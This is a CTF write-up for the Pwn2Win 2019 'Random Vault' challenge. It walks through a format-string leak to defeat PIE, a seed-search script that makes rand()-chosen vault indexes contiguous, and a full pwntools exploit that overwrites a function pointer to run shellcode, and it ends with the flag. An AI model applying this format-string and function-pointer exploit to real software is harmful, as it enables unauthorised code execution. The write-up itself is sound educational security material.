---
title: Random Vault  
ctf: Pwn2Win 2019 CTF
tags: [pwn2win, pwn, shellcode, srand, writeup]
date: 2019-11-10
description: "The program 2-shot format string: 1) bypass PIE; 2) modify srand seed and function pointer. The new seed lets us control the RIP so we can land on our shellcode."
---

With [Jorge](https://twitter.com/jorge_cmartins)

**Points:** 303 (dynamic)
**Solves:** 18

## TL;DR
1. Only two Format String vulnerability allowed.
2. Use first Format String to bypass PIE mitigation
3. Use second Format String to:
    - change srand() seed value
    - change function pointer 
4. Built shellcode and get shell



## Reversing

#### Binary Mitigations

```
Arch:   amd64-64-little
RELRO:  FULL RELRO
STACK:  Canary Found
NX:     NX enabled
PIE:    PIE enabled
```

The binary functionality is pretty simple:

#### 1. Change username
Let's you change the username **once**, will lead to `printf(username)`. The `username` is a maximum of 80 bytes long.
#### 2. Store secret
- We can store 7 secrets in the `vault` (a buffer in the `.bss`).
- Each secret is indexed on the `vault` by the last byte of `rand()`, so we don't have full control where they are stored:
```c
for (i = 0; i <= 6; ++i){
    printf("Secret #%d: ", i+1);
    r = rand();
    local_buffer[i] = r & 0xff;
    scanf("%llu", &vault[local_buffer[i]]);
}
```
- After each store, a function pointer,`target`, is called which resets the  `seed` to `seed = time(0)` and asks us if we want to reset the vault.
#### 3. Reset vault
Clears the `vault` to 0, resets the `target` pointer, resets the `seed` to `time(0)`

> **Notes:**
> The `target`, `seed` and the`vault` are all together in the bss segment:
> ```
0x5000 -> target
0x5008 -> seed
0x5010 -> vault start
      ...
0x6000 -> vault end
```
>
> And this segment has `rwx` permissions: `mprotect(&target, 0x1000, 7)`

## Vulnerability

Doing some tests on the program, we quickly spotted a format string vulnerability on `Username`

```
Welcome to the Vault!
Username: %p|%p|%p|%p
=== VAULT ===
Hello, 0x2|0xf|(nil)|0x5

Actions:
1. Change username
2. Store secret
3. Reset vault
4. Quit
```

## Exploitation

Since we can leak stack values with `username`, we immediately got the `stack cookie` and defeated `PIE mitigation`, now we know where the `target`, `seed` and `vault` are. Getting the `stack cookie` turned out to be useless since no overflow was found.
We need to keep in mind that we can write to `vault` which has `rwx` permissions, and we can overwrite `target`, with the format string, to point to the `vault`. So we need to write shellcode to the `vault`, and overwrite `target` to point to our shellcode.
There are two problems with this approach:
1. We can't control the exact location where we write in the `vault`, because the indexes are generated from the `rand()` call.
2. Brute forcing the indexes to be contiguous on a fixed offset was taking too much time.
3. If we first get a contiguous shellcode, we can't then jump to it because changing the username to alter `target` will reset the `vault`.

To solve both of this problems we could to find a `seed` value that generates at least 4 consecutive indexes out of the 7 (i.e., 1, 2, 3, 4) in order for our shellcode to be contiguous. Since our shellcode is 27 bytes long, we padded it with `nops` it becomes 32 bytes = 4 * 8.
Finding the seed is quite straightforward, with `seed = 0xdcd8`, we get 
following indexes: `12, 215, 164, 11, 64, 9, 10`
This was the script we wrote:
```python
from ctypes import *
libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")

for seed in range(0, 0x10000):
    this_round = []
    libc.srand(seed) 
    for _ in range(7):
        this_round.append(libc.rand() & 0xff)
        
    this_round.sort()
    counter = 0
    for i in range(7-1): 
        if this_round[i + 1] - this_round[i] == 1:
            counter += 1
        else:
            counter = 0
        if counter == 3:
            # show the seed and the offset to jump to
            print "seed ", hex(seed)
            print "first offset ", this_round[i+1-3]
            break
```

We have to keep in mind that the `username` buffer is only 80 bytes long, and we are on a 64-bit architecture, so have to be conservative with what we want to write.  
Because of this, we had to only partially overwrite the `target` so we could also overwrite the `seed`. 

This is our final exploit:
```python
from pwn import *
from fs_lib import *

def leak(io):
    payload = "%9$p|%11$p"
    io.sendlineafter("Username: ", payload)
    io.recvuntil("Hello, ")
    output = io.recvline()
    cookie = int(output.split("|")[0], 16)
    elf    = int(output.split("|")[1], 16) - 0x1750

    return (cookie, elf)

def exploit():
    io = remote("200.136.252.34", 1245)

    cookie, elf = leak(io)

    target = elf + 0x5000
    check  = elf + 0x4028
    vault  = elf + 0x5010
    seed   = elf + 0x5008

    log.info("cookie @ {}".format(hex(cookie)))
    log.info("elf    @ {}".format(hex(elf)))
    log.info("target @ {}".format(hex(target)))
    log.info("check  @ {}".format(hex(check)))



    seed_value = 0xdcd8
    first_rand_index = 9
    fptr_value = (vault & 0xffff) + first_rand_index*8

    # homegrown format string library
    fs = FormatString(offset=24)
    # write in 1 go, will overwrite the entire seed
    fs.write(value=seed_value, step=8, addr=seed)
    # write short (hn) will only overwrite 2 bytes
    fs.write(value=fptr_value, step=2, addr=target)
    payload = fs.payload()
    
    #overwrite target and seed
    io.sendline("1")
    io.sendline(payload)
    
    #write shellcode to vault
    io.sendline("2")
    io.sendlineafter(": ", str(u64(shellcode[-8:])))
    io.sendlineafter(": ", "+") # skip scanf
    io.sendlineafter(": ", "+")
    io.sendlineafter(": ", str(u64(shellcode[-16:-8])))
    io.sendlineafter(": ", "+")
    io.sendlineafter(": ", str(u64(shellcode[:8])))
    io.sendlineafter(": ", str(u64(shellcode[8:16])))

    io.interactive()
    io.close()

exploit()
#CTF-BR{_r4nd0m_1nd1c3s_m4ke_th3_ch4ll3nge_m0r3_fun_}
```

